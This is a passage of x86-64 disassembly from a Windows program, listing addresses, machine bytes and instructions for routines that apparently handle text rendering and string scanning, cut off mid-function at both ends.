   140003c30:	45 0f 4c d0          	cmovl  %r8d,%r10d
   140003c34:	41 83 fa 04          	cmp    $0x4,%r10d
   140003c38:	0f 8c b8 01 00 00    	jl     0x140003df6
   140003c3e:	41 8d 42 fc          	lea    -0x4(%r10),%eax
   140003c42:	c1 e8 02             	shr    $0x2,%eax
   140003c45:	ff c0                	inc    %eax
   140003c47:	44 8b d8             	mov    %eax,%r11d
   140003c4a:	f7 d8                	neg    %eax
   140003c4c:	45 8d 14 82          	lea    (%r10,%rax,4),%r10d
   140003c50:	49 63 c0             	movslq %r8d,%rax
   140003c53:	4c 8b 82 38 48 00 00 	mov    0x4838(%rdx),%r8
   140003c5a:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   140003c5e:	49 63 44 88 f4       	movslq -0xc(%r8,%rcx,4),%rax
   140003c63:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140003c67:	83 3c 83 08          	cmpl   $0x8,(%rbx,%rax,4)
   140003c6b:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
   140003c70:	75 37                	jne    0x140003ca9
   140003c72:	8b 44 83 04          	mov    0x4(%rbx,%rax,4),%eax
   140003c76:	83 f8 01             	cmp    $0x1,%eax
   140003c79:	75 0f                	jne    0x140003c8a
   140003c7b:	41 8b 44 88 f8       	mov    -0x8(%r8,%rcx,4),%eax
   140003c80:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003c87:	00 
   140003c88:	eb 1f                	jmp    0x140003ca9
   140003c8a:	83 f8 02             	cmp    $0x2,%eax
   140003c8d:	75 1a                	jne    0x140003ca9
   140003c8f:	41 8b 44 88 f8       	mov    -0x8(%r8,%rcx,4),%eax
   140003c94:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003c9b:	00 
   140003c9c:	41 8b 44 88 fc       	mov    -0x4(%r8,%rcx,4),%eax
   140003ca1:	41 89 84 11 cc 37 00 	mov    %eax,0x37cc(%r9,%rdx,1)
   140003ca8:	00 
   140003ca9:	48 63 8a 30 48 00 00 	movslq 0x4830(%rdx),%rcx
   140003cb0:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003cb3:	89 82 30 48 00 00    	mov    %eax,0x4830(%rdx)
   140003cb9:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   140003cbd:	4c 8b 82 38 48 00 00 	mov    0x4838(%rdx),%r8
   140003cc4:	49 63 44 88 e8       	movslq -0x18(%r8,%rcx,4),%rax
   140003cc9:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140003ccd:	83 3c 83 08          	cmpl   $0x8,(%rbx,%rax,4)
   140003cd1:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
   140003cd6:	75 37                	jne    0x140003d0f
   140003cd8:	8b 44 83 04          	mov    0x4(%rbx,%rax,4),%eax
   140003cdc:	83 f8 01             	cmp    $0x1,%eax
   140003cdf:	75 0f                	jne    0x140003cf0
   140003ce1:	41 8b 44 88 ec       	mov    -0x14(%r8,%rcx,4),%eax
   140003ce6:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003ced:	00 
   140003cee:	eb 1f                	jmp    0x140003d0f
   140003cf0:	83 f8 02             	cmp    $0x2,%eax
   140003cf3:	75 1a                	jne    0x140003d0f
   140003cf5:	41 8b 44 88 ec       	mov    -0x14(%r8,%rcx,4),%eax
   140003cfa:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003d01:	00 
   140003d02:	41 8b 44 88 f0       	mov    -0x10(%r8,%rcx,4),%eax
   140003d07:	41 89 84 11 cc 37 00 	mov    %eax,0x37cc(%r9,%rdx,1)
   140003d0e:	00 
   140003d0f:	48 63 8a 30 48 00 00 	movslq 0x4830(%rdx),%rcx
   140003d16:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003d19:	89 82 30 48 00 00    	mov    %eax,0x4830(%rdx)
   140003d1f:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   140003d23:	4c 8b 82 38 48 00 00 	mov    0x4838(%rdx),%r8
   140003d2a:	49 63 44 88 e8       	movslq -0x18(%r8,%rcx,4),%rax
   140003d2f:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140003d33:	83 3c 83 08          	cmpl   $0x8,(%rbx,%rax,4)
   140003d37:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
   140003d3c:	75 37                	jne    0x140003d75
   140003d3e:	8b 44 83 04          	mov    0x4(%rbx,%rax,4),%eax
   140003d42:	83 f8 01             	cmp    $0x1,%eax
   140003d45:	75 0f                	jne    0x140003d56
   140003d47:	41 8b 44 88 ec       	mov    -0x14(%r8,%rcx,4),%eax
   140003d4c:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003d53:	00 
   140003d54:	eb 1f                	jmp    0x140003d75
   140003d56:	83 f8 02             	cmp    $0x2,%eax
   140003d59:	75 1a                	jne    0x140003d75
   140003d5b:	41 8b 44 88 ec       	mov    -0x14(%r8,%rcx,4),%eax
   140003d60:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003d67:	00 
   140003d68:	41 8b 44 88 f0       	mov    -0x10(%r8,%rcx,4),%eax
   140003d6d:	41 89 84 11 cc 37 00 	mov    %eax,0x37cc(%r9,%rdx,1)
   140003d74:	00 
   140003d75:	48 63 8a 30 48 00 00 	movslq 0x4830(%rdx),%rcx
   140003d7c:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140003d7f:	89 82 30 48 00 00    	mov    %eax,0x4830(%rdx)
   140003d85:	48 8d 0c 49          	lea    (%rcx,%rcx,2),%rcx
   140003d89:	4c 8b 82 38 48 00 00 	mov    0x4838(%rdx),%r8
   140003d90:	49 63 44 88 e8       	movslq -0x18(%r8,%rcx,4),%rax
   140003d95:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140003d99:	83 3c 83 08          	cmpl   $0x8,(%rbx,%rax,4)
   140003d9d:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
   140003da2:	75 37                	jne    0x140003ddb
   140003da4:	8b 44 83 04          	mov    0x4(%rbx,%rax,4),%eax
   140003da8:	83 f8 01             	cmp    $0x1,%eax
   140003dab:	75 0f                	jne    0x140003dbc
   140003dad:	41 8b 44 88 ec       	mov    -0x14(%r8,%rcx,4),%eax
   140003db2:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003db9:	00 
   140003dba:	eb 1f                	jmp    0x140003ddb
   140003dbc:	83 f8 02             	cmp    $0x2,%eax
   140003dbf:	75 1a                	jne    0x140003ddb
   140003dc1:	41 8b 44 88 ec       	mov    -0x14(%r8,%rcx,4),%eax
   140003dc6:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003dcd:	00 
   140003dce:	41 8b 44 88 f0       	mov    -0x10(%r8,%rcx,4),%eax
   140003dd3:	41 89 84 11 cc 37 00 	mov    %eax,0x37cc(%r9,%rdx,1)
   140003dda:	00 
   140003ddb:	44 8b 82 30 48 00 00 	mov    0x4830(%rdx),%r8d
   140003de2:	41 ff c8             	dec    %r8d
   140003de5:	44 89 82 30 48 00 00 	mov    %r8d,0x4830(%rdx)
   140003dec:	49 83 eb 01          	sub    $0x1,%r11
   140003df0:	0f 85 5a fe ff ff    	jne    0x140003c50
   140003df6:	45 85 d2             	test   %r10d,%r10d
   140003df9:	7e 6e                	jle    0x140003e69
   140003dfb:	49 63 c0             	movslq %r8d,%rax
   140003dfe:	4c 8b 82 38 48 00 00 	mov    0x4838(%rdx),%r8
   140003e05:	48 8d 0c 40          	lea    (%rax,%rax,2),%rcx
   140003e09:	49 63 44 88 f4       	movslq -0xc(%r8,%rcx,4),%rax
   140003e0e:	48 8d 04 40          	lea    (%rax,%rax,2),%rax
   140003e12:	83 3c 83 08          	cmpl   $0x8,(%rbx,%rax,4)
   140003e16:	44 8b 4c 83 08       	mov    0x8(%rbx,%rax,4),%r9d
   140003e1b:	75 37                	jne    0x140003e54
   140003e1d:	8b 44 83 04          	mov    0x4(%rbx,%rax,4),%eax
   140003e21:	83 f8 01             	cmp    $0x1,%eax
   140003e24:	75 0f                	jne    0x140003e35
   140003e26:	41 8b 44 88 f8       	mov    -0x8(%r8,%rcx,4),%eax
   140003e2b:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003e32:	00 
   140003e33:	eb 1f                	jmp    0x140003e54
   140003e35:	83 f8 02             	cmp    $0x2,%eax
   140003e38:	75 1a                	jne    0x140003e54
   140003e3a:	41 8b 44 88 f8       	mov    -0x8(%r8,%rcx,4),%eax
   140003e3f:	41 89 84 11 c8 37 00 	mov    %eax,0x37c8(%r9,%rdx,1)
   140003e46:	00 
   140003e47:	41 8b 44 88 fc       	mov    -0x4(%r8,%rcx,4),%eax
   140003e4c:	41 89 84 11 cc 37 00 	mov    %eax,0x37cc(%r9,%rdx,1)
   140003e53:	00 
   140003e54:	ff 8a 30 48 00 00    	decl   0x4830(%rdx)
   140003e5a:	41 ff ca             	dec    %r10d
   140003e5d:	44 8b 82 30 48 00 00 	mov    0x4830(%rdx),%r8d
   140003e64:	45 85 d2             	test   %r10d,%r10d
   140003e67:	7f 92                	jg     0x140003dfb
   140003e69:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   140003e6e:	c3                   	ret
   140003e6f:	cc                   	int3
   140003e70:	40 53                	rex push %rbx
   140003e72:	55                   	push   %rbp
   140003e73:	56                   	push   %rsi
   140003e74:	57                   	push   %rdi
   140003e75:	41 56                	push   %r14
   140003e77:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   140003e7e:	48 8b 2d 7b b9 04 00 	mov    0x4b97b(%rip),%rbp        # 0x14004f800
   140003e85:	48 8b fa             	mov    %rdx,%rdi
   140003e88:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   140003e8d:	48 8b f5             	mov    %rbp,%rsi
   140003e90:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   140003e97:	4c 8b 95 d8 3e 00 00 	mov    0x3ed8(%rbp),%r10
   140003e9e:	45 84 c9             	test   %r9b,%r9b
   140003ea1:	74 30                	je     0x140003ed3
   140003ea3:	48 8b da             	mov    %rdx,%rbx
   140003ea6:	4d 85 c0             	test   %r8,%r8
   140003ea9:	49 8b d6             	mov    %r14,%rdx
   140003eac:	49 0f 45 d0          	cmovne %r8,%rdx
   140003eb0:	48 3b da             	cmp    %rdx,%rbx
   140003eb3:	73 3d                	jae    0x140003ef2
   140003eb5:	0f b6 0b             	movzbl (%rbx),%ecx
   140003eb8:	84 c9                	test   %cl,%cl
   140003eba:	74 36                	je     0x140003ef2
   140003ebc:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140003ec0:	80 f9 23             	cmp    $0x23,%cl
   140003ec3:	75 04                	jne    0x140003ec9
   140003ec5:	38 08                	cmp    %cl,(%rax)
   140003ec7:	74 29                	je     0x140003ef2
   140003ec9:	48 8b d8             	mov    %rax,%rbx
   140003ecc:	48 3b c2             	cmp    %rdx,%rax
   140003ecf:	72 e4                	jb     0x140003eb5
   140003ed1:	eb 1f                	jmp    0x140003ef2
   140003ed3:	4d 85 c0             	test   %r8,%r8
   140003ed6:	75 17                	jne    0x140003eef
   140003ed8:	49 8b c6             	mov    %r14,%rax
   140003edb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ee0:	80 7c 02 01 00       	cmpb   $0x0,0x1(%rdx,%rax,1)
   140003ee5:	48 8d 40 01          	lea    0x1(%rax),%rax
   140003ee9:	75 f5                	jne    0x140003ee0
   140003eeb:	4c 8d 04 10          	lea    (%rax,%rdx,1),%r8
   140003eef:	49 8b d8             	mov    %r8,%rbx
   140003ef2:	48 3b fb             	cmp    %rbx,%rdi
   140003ef5:	0f 84 7a 02 00 00    	je     0x140004175
   140003efb:	0f 10 85 a4 38 00 00 	movups 0x38a4(%rbp),%xmm0
   140003f02:	4d 8b 82 98 02 00 00 	mov    0x298(%r10),%r8
   140003f09:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140003f0e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140003f13:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140003f17:	f3 0f 59 85 c8 37 00 	mulss  0x37c8(%rbp),%xmm0
   140003f1e:	00 
   140003f1f:	f3 0f 11 44 24 5c    	movss  %xmm0,0x5c(%rsp)
   140003f25:	e8 96 f8 ff ff       	call   0x1400037c0
   140003f2a:	f3 0f 10 95 10 3c 00 	movss  0x3c10(%rbp),%xmm2
   140003f31:	00 
   140003f32:	44 8b c8             	mov    %eax,%r9d
   140003f35:	4c 8b 95 08 3c 00 00 	mov    0x3c08(%rbp),%r10
   140003f3c:	48 8b cb             	mov    %rbx,%rcx
   140003f3f:	a9 00 00 00 ff       	test   $0xff000000,%eax
   140003f44:	0f 84 81 00 00 00    	je     0x140003fcb
   140003f4a:	48 85 db             	test   %rbx,%rbx
   140003f4d:	75 14                	jne    0x140003f63
   140003f4f:	49 8b ce             	mov    %r14,%rcx
   140003f52:	48 ff c1             	inc    %rcx
   140003f55:	80 3c 0f 00          	cmpb   $0x0,(%rdi,%rcx,1)
   140003f59:	75 f7                	jne    0x140003f52
   140003f5b:	48 03 cf             	add    %rdi,%rcx
   140003f5e:	48 3b f9             	cmp    %rcx,%rdi
   140003f61:	74 68                	je     0x140003fcb
   140003f63:	4d 85 d2             	test   %r10,%r10
   140003f66:	75 08                	jne    0x140003f70
   140003f68:	49 8b 40 38          	mov    0x38(%r8),%rax
   140003f6c:	4c 8b 50 08          	mov    0x8(%rax),%r10
   140003f70:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003f73:	0f 2e d1             	ucomiss %xmm1,%xmm2
   140003f76:	7a 0b                	jp     0x140003f83
   140003f78:	75 09                	jne    0x140003f83
   140003f7a:	49 8b 40 38          	mov    0x38(%r8),%rax
   140003f7e:	f3 0f 10 50 10       	movss  0x10(%rax),%xmm2
   140003f83:	41 0f 10 80 88 00 00 	movups 0x88(%r8),%xmm0
   140003f8a:	00 
   140003f8b:	c6 44 24 48 00       	movb   $0x0,0x48(%rsp)
   140003f90:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140003f95:	f3 0f 11 4c 24 40    	movss  %xmm1,0x40(%rsp)
   140003f9b:	49 8b d0             	mov    %r8,%rdx
   140003f9e:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140003fa3:	49 8b ca             	mov    %r10,%rcx
   140003fa6:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140003fab:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140003fb0:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   140003fb5:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003fba:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140003fbf:	e8 ac 60 02 00       	call   0x14002a070
   140003fc4:	48 8b 2d 35 b8 04 00 	mov    0x4b835(%rip),%rbp        # 0x14004f800
   140003fcb:	80 be 98 5c 00 00 00 	cmpb   $0x0,0x5c98(%rsi)
   140003fd2:	0f 84 9d 01 00 00    	je     0x140004175
   140003fd8:	48 8b b5 b8 5c 00 00 	mov    0x5cb8(%rbp),%rsi
   140003fdf:	33 c0                	xor    %eax,%eax
   140003fe1:	4c 89 64 24 78       	mov    %r12,0x78(%rsp)
   140003fe6:	4c 8b a5 d8 3e 00 00 	mov    0x3ed8(%rbp),%r12
   140003fed:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   140003ff2:	4c 8b bd c0 5c 00 00 	mov    0x5cc0(%rbp),%r15
   140003ff9:	48 89 85 c0 5c 00 00 	mov    %rax,0x5cc0(%rbp)
   140004000:	48 89 85 b8 5c 00 00 	mov    %rax,0x5cb8(%rbp)
   140004007:	48 85 db             	test   %rbx,%rbx
   14000400a:	75 26                	jne    0x140004032
   14000400c:	48 8b df             	mov    %rdi,%rbx
   14000400f:	48 83 ff ff          	cmp    $0xffffffffffffffff,%rdi
   140004013:	73 1d                	jae    0x140004032
   140004015:	0f b6 0b             	movzbl (%rbx),%ecx
   140004018:	84 c9                	test   %cl,%cl
   14000401a:	74 16                	je     0x140004032
   14000401c:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140004020:	80 f9 23             	cmp    $0x23,%cl
   140004023:	75 04                	jne    0x140004029
   140004025:	38 08                	cmp    %cl,(%rax)
   140004027:	74 09                	je     0x140004032
   140004029:	48 8b d8             	mov    %rax,%rbx
   14000402c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004030:	72 e3                	jb     0x140004015
   140004032:	f3 0f 10 4c 24 64    	movss  0x64(%rsp),%xmm1
   140004038:	f3 0f 10 85 08 38 00 	movss  0x3808(%rbp),%xmm0
   14000403f:	00 
   140004040:	f3 0f 58 85 c8 5c 00 	addss  0x5cc8(%rbp),%xmm0
   140004047:	00 
   140004048:	f3 0f 11 8d c8 5c 00 	movss  %xmm1,0x5cc8(%rbp)
   14000404f:	00 
   140004050:	f3 0f 58 05 8c 41 04 	addss  0x4418c(%rip),%xmm0        # 0x1400481e4
   140004057:	00 
   140004058:	0f 2f c8             	comiss %xmm0,%xmm1
   14000405b:	76 13                	jbe    0x140004070
   14000405d:	48 8d 0d 80 e6 03 00 	lea    0x3e680(%rip),%rcx        # 0x1400426e4
   140004064:	e8 97 4a 01 00       	call   0x140018b00
   140004069:	c6 85 cc 5c 00 00 01 	movb   $0x1,0x5ccc(%rbp)
   140004070:	48 85 f6             	test   %rsi,%rsi
   140004073:	74 27                	je     0x14000409c
   140004075:	49 8b c6             	mov    %r14,%rax
   140004078:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000407f:	00 
   140004080:	80 7c 06 01 00       	cmpb   $0x0,0x1(%rsi,%rax,1)
   140004085:	48 8d 40 01          	lea    0x1(%rax),%rax
   140004089:	75 f5                	jne    0x140004080
   14000408b:	4c 8d 04 30          	lea    (%rax,%rsi,1),%r8
   14000408f:	48 8b d6             	mov    %rsi,%rdx
   140004092:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004097:	e8 a4 4a 01 00       	call   0x140018b40
   14000409c:	41 8b 84 24 88 01 00 	mov    0x188(%r12),%eax
   1400040a3:	00 
   1400040a4:	8b 8d d0 5c 00 00    	mov    0x5cd0(%rbp),%ecx
   1400040aa:	3b c8                	cmp    %eax,%ecx
   1400040ac:	7e 08                	jle    0x1400040b6
   1400040ae:	89 85 d0 5c 00 00    	mov    %eax,0x5cd0(%rbp)
   1400040b4:	8b c8                	mov    %eax,%ecx
   1400040b6:	45 8b a4 24 88 01 00 	mov    0x188(%r12),%r12d
   1400040bd:	00 
   1400040be:	44 2b e1             	sub    %ecx,%r12d
   1400040c1:	4c 8b c3             	mov    %rbx,%r8
   1400040c4:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400040c9:	4c 2b c7             	sub    %rdi,%r8
   1400040cc:	48 8b cf             	mov    %rdi,%rcx
   1400040cf:	e8 83 b7 03 00       	call   0x14003f857
   1400040d4:	48 85 c0             	test   %rax,%rax
   1400040d7:	48 8b f3             	mov    %rbx,%rsi
   1400040da:	48 0f 45 f0          	cmovne %rax,%rsi
   1400040de:	48 3b fe             	cmp    %rsi,%rdi
   1400040e1:	75 05                	jne    0x1400040e8
   1400040e3:	48 3b f3             	cmp    %rbx,%rsi
   1400040e6:	74 61                	je     0x140004149
   1400040e8:	44 8b ce             	mov    %esi,%r9d
   1400040eb:	42 8d 14 a5 00 00 00 	lea    0x0(,%r12,4),%edx
   1400040f2:	00 
   1400040f3:	44 2b cf             	sub    %edi,%r9d
   1400040f6:	80 bd cc 5c 00 00 00 	cmpb   $0x0,0x5ccc(%rbp)
   1400040fd:	75 05                	jne    0x140004104
   1400040ff:	ba 01 00 00 00       	mov    $0x1,%edx
   140004104:	4c 8d 05 23 d8 03 00 	lea    0x3d823(%rip),%r8        # 0x14004192e
   14000410b:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140004110:	48 8d 0d d1 e5 03 00 	lea    0x3e5d1(%rip),%rcx        # 0x1400426e8
   140004117:	e8 e4 49 01 00       	call   0x140018b00
   14000411c:	c6 85 cc 5c 00 00 00 	movb   $0x0,0x5ccc(%rbp)
   140004123:	80 3e 0a             	cmpb   $0xa,(%rsi)
   140004126:	75 13                	jne    0x14000413b
   140004128:	48 8d 0d b5 e5 03 00 	lea    0x3e5b5(%rip),%rcx        # 0x1400426e4
   14000412f:	e8 cc 49 01 00       	call   0x140018b00
   140004134:	c6 85 cc 5c 00 00 01 	movb   $0x1,0x5ccc(%rbp)
   14000413b:	48 3b f3             	cmp    %rbx,%rsi
   14000413e:	74 09                	je     0x140004149
   140004140:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   140004144:	e9 78 ff ff ff       	jmp    0x1400040c1
   140004149:	4c 8b 64 24 78       	mov    0x78(%rsp),%r12
   14000414e:	4d 85 ff             	test   %r15,%r15
   140004151:	74 1d                	je     0x140004170
   140004153:	43 80 7c 37 01 00    	cmpb   $0x0,0x1(%r15,%r14,1)
   140004159:	4d 8d 76 01          	lea    0x1(%r14),%r14
   14000415d:	75 f4                	jne    0x140004153
   14000415f:	4f 8d 04 3e          	lea    (%r14,%r15,1),%r8
   140004163:	49 8b d7             	mov    %r15,%rdx
   140004166:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000416b:	e8 d0 49 01 00       	call   0x140018b40
   140004170:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140004175:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   14000417c:	41 5e                	pop    %r14
   14000417e:	5f                   	pop    %rdi
   14000417f:	5e                   	pop    %rsi
   140004180:	5d                   	pop    %rbp
   140004181:	5b                   	pop    %rbx
   140004182:	c3                   	ret
   140004183:	cc                   	int3
   140004184:	cc                   	int3
   140004185:	cc                   	int3
   140004186:	cc                   	int3
   140004187:	cc                   	int3
   140004188:	cc                   	int3
   140004189:	cc                   	int3
   14000418a:	cc                   	int3
   14000418b:	cc                   	int3
   14000418c:	cc                   	int3
   14000418d:	cc                   	int3
   14000418e:	cc                   	int3
   14000418f:	cc                   	int3
   140004190:	40 53                	rex push %rbx
   140004192:	55                   	push   %rbp
   140004193:	56                   	push   %rsi
   140004194:	57                   	push   %rdi
   140004195:	41 56                	push   %r14
   140004197:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000419e:	48 8b 2d 5b b6 04 00 	mov    0x4b65b(%rip),%rbp        # 0x14004f800
   1400041a5:	49 8b d8             	mov    %r8,%rbx
   1400041a8:	0f 29 74 24 70       	movaps %xmm6,0x70(%rsp)
   1400041ad:	0f 28 f3             	movaps %xmm3,%xmm6
   1400041b0:	48 89 4c 24 60       	mov    %rcx,0x60(%rsp)
   1400041b5:	48 8b fa             	mov    %rdx,%rdi
   1400041b8:	48 8b f5             	mov    %rbp,%rsi
   1400041bb:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   1400041c2:	4c 8b 85 d8 3e 00 00 	mov    0x3ed8(%rbp),%r8
   1400041c9:	48 85 db             	test   %rbx,%rbx
   1400041cc:	75 12                	jne    0x1400041e0
   1400041ce:	49 8b c6             	mov    %r14,%rax
   1400041d1:	80 7c 02 01 00       	cmpb   $0x0,0x1(%rdx,%rax,1)
   1400041d6:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400041da:	75 f5                	jne    0x1400041d1
   1400041dc:	48 8d 1c 10          	lea    (%rax,%rdx,1),%rbx
   1400041e0:	48 3b fb             	cmp    %rbx,%rdi
   1400041e3:	0f 84 8c 02 00 00    	je     0x140004475
   1400041e9:	0f 10 85 a4 38 00 00 	movups 0x38a4(%rbp),%xmm0
   1400041f0:	4d 8b 80 98 02 00 00 	mov    0x298(%r8),%r8
   1400041f7:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400041fc:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004201:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004205:	f3 0f 59 85 c8 37 00 	mulss  0x37c8(%rbp),%xmm0
   14000420c:	00 
   14000420d:	f3 0f 11 44 24 5c    	movss  %xmm0,0x5c(%rsp)
   140004213:	e8 a8 f5 ff ff       	call   0x1400037c0
   140004218:	f3 0f 10 95 10 3c 00 	movss  0x3c10(%rbp),%xmm2
   14000421f:	00 
   140004220:	44 8b c8             	mov    %eax,%r9d
   140004223:	4c 8b 95 08 3c 00 00 	mov    0x3c08(%rbp),%r10
   14000422a:	48 8b cb             	mov    %rbx,%rcx
   14000422d:	a9 00 00 00 ff       	test   $0xff000000,%eax
   140004232:	0f 84 81 00 00 00    	je     0x1400042b9
   140004238:	48 85 db             	test   %rbx,%rbx
   14000423b:	75 14                	jne    0x140004251
   14000423d:	49 8b ce             	mov    %r14,%rcx
   140004240:	48 ff c1             	inc    %rcx
   140004243:	80 3c 0f 00          	cmpb   $0x0,(%rdi,%rcx,1)
   140004247:	75 f7                	jne    0x140004240
   140004249:	48 03 cf             	add    %rdi,%rcx
   14000424c:	48 3b f9             	cmp    %rcx,%rdi
   14000424f:	74 68                	je     0x1400042b9
   140004251:	4d 85 d2             	test   %r10,%r10
   140004254:	75 08                	jne    0x14000425e
   140004256:	49 8b 40 38          	mov    0x38(%r8),%rax
   14000425a:	4c 8b 50 08          	mov    0x8(%rax),%r10
   14000425e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004261:	0f 2e d0             	ucomiss %xmm0,%xmm2
   140004264:	7a 0b                	jp     0x140004271
   140004266:	75 09                	jne    0x140004271
   140004268:	49 8b 40 38          	mov    0x38(%r8),%rax
   14000426c:	f3 0f 10 50 10       	movss  0x10(%rax),%xmm2
   140004271:	41 0f 10 80 88 00 00 	movups 0x88(%r8),%xmm0
   140004278:	00 
   140004279:	c6 44 24 48 00       	movb   $0x0,0x48(%rsp)
   14000427e:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140004283:	f3 0f 11 74 24 40    	movss  %xmm6,0x40(%rsp)
   140004289:	49 8b d0             	mov    %r8,%rdx
   14000428c:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140004291:	49 8b ca             	mov    %r10,%rcx
   140004294:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140004299:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000429e:	44 89 4c 24 20       	mov    %r9d,0x20(%rsp)
   1400042a3:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1400042a8:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400042ad:	e8 be 5d 02 00       	call   0x14002a070
   1400042b2:	48 8b 2d 47 b5 04 00 	mov    0x4b547(%rip),%rbp        # 0x14004f800
   1400042b9:	80 be 98 5c 00 00 00 	cmpb   $0x0,0x5c98(%rsi)
   1400042c0:	0f 84 af 01 00 00    	je     0x140004475
   1400042c6:	48 8b b5 b8 5c 00 00 	mov    0x5cb8(%rbp),%rsi
   1400042cd:	33 c0                	xor    %eax,%eax
   1400042cf:	4c 89 a4 24 88 00 00 	mov    %r12,0x88(%rsp)
   1400042d6:	00 
   1400042d7:	4c 8b a5 d8 3e 00 00 	mov    0x3ed8(%rbp),%r12
   1400042de:	4c 89 bc 24 80 00 00 	mov    %r15,0x80(%rsp)
   1400042e5:	00 
   1400042e6:	4c 8b bd c0 5c 00 00 	mov    0x5cc0(%rbp),%r15
   1400042ed:	48 89 85 c0 5c 00 00 	mov    %rax,0x5cc0(%rbp)
   1400042f4:	48 89 85 b8 5c 00 00 	mov    %rax,0x5cb8(%rbp)
   1400042fb:	48 85 db             	test   %rbx,%rbx
   1400042fe:	75 24                	jne    0x140004324
   140004300:	48 8b df             	mov    %rdi,%rbx
   140004303:	49 3b fe             	cmp    %r14,%rdi
   140004306:	73 1c                	jae    0x140004324
   140004308:	0f b6 0b             	movzbl (%rbx),%ecx
   14000430b:	84 c9                	test   %cl,%cl
   14000430d:	74 15                	je     0x140004324
   14000430f:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140004313:	80 f9 23             	cmp    $0x23,%cl
   140004316:	75 04                	jne    0x14000431c
   140004318:	38 08                	cmp    %cl,(%rax)
   14000431a:	74 08                	je     0x140004324
   14000431c:	48 8b d8             	mov    %rax,%rbx
   14000431f:	49 3b c6             	cmp    %r14,%rax
   140004322:	72 e4                	jb     0x140004308
   140004324:	f3 0f 10 4c 24 64    	movss  0x64(%rsp),%xmm1
   14000432a:	f3 0f 10 85 08 38 00 	movss  0x3808(%rbp),%xmm0
   140004331:	00 
   140004332:	f3 0f 58 85 c8 5c 00 	addss  0x5cc8(%rbp),%xmm0
   140004339:	00 
   14000433a:	f3 0f 11 8d c8 5c 00 	movss  %xmm1,0x5cc8(%rbp)
   140004341:	00 
   140004342:	f3 0f 58 05 9a 3e 04 	addss  0x43e9a(%rip),%xmm0        # 0x1400481e4
   140004349:	00 
   14000434a:	0f 2f c8             	comiss %xmm0,%xmm1
   14000434d:	76 13                	jbe    0x140004362
   14000434f:	48 8d 0d 8e e3 03 00 	lea    0x3e38e(%rip),%rcx        # 0x1400426e4
   140004356:	e8 a5 47 01 00       	call   0x140018b00
   14000435b:	c6 85 cc 5c 00 00 01 	movb   $0x1,0x5ccc(%rbp)
   140004362:	48 85 f6             	test   %rsi,%rsi
   140004365:	74 25                	je     0x14000438c
   140004367:	49 8b c6             	mov    %r14,%rax
